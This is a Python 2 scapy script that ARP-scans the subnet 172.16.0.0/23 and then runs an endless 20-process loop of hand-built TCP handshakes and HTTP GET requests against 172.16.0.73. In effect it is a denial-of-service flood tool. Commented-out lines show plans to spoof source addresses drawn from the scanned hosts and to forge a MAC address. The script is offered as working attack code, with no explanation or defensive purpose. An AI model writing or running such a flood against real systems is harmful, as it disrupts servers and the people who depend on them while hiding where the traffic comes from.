import os
import sys
import random
from multiprocessing import Process, Pool
from scapy.all import *

ether_pkt = None
dst_ip = None
ip_addr = []

def send_packets():
	global dst_ip
	global ether_pkt
	global ip_addr
	
	# src_ip = random.choice(ip_addr)

	# syn = IP(src=src_ip, dst=dst_ip) / TCP(dport=80, flags='S')
	
	# syn = ether_pkt / IP(src=src_ip, dst='172.16.0.51') / TCP(dport=80, flags='S')

	syn = IP(dst='172.16.0.73') / TCP(dport=80, flags='S')	

	syn_ack = sr1(syn)
	
	getStr = 'GET / HTTP/1.1\r\nHost: 172.16.0.73\r\n\r\n'

	# getStr = 'GET / HTTP/1.1\r\nHost: '+dst_ip+'\r\n\r\n'

	# req_packet = ether_pkt / IP() / TCP(dport=80, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A') / getStr


	req_packet = IP() / TCP(dport=80, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A') / getStr

	# req_packet.src = src_ip
	req_packet.dst = "172.16.0.73"

	reply_packet = sr1(req_packet)
	return 

def input_details():
	global dst_ip
	global ether_pkt
	global ip_addr

	# subnet_addr = raw_input("Enter subnet address (192.168.1.0/24) :- ")
	# dst_ip = raw_input("Enter destination ip :- ")

	# ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet_addr),timeout=2)
	ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="172.16.0.0/23"),timeout=2)
	
	ans.summary(lambda(sender,receiver): ip_addr.append(sender.pdst))

	# ether_pkt = Ether()
	# ether_pkt.src = "00:00:01:02:05:05"
	# ether_pkt.display()

def main():
	input_details()

	pool = Pool(processes=20)

	while True:
		pool.apply_async(send_packets)

if __name__ == '__main__':
	main()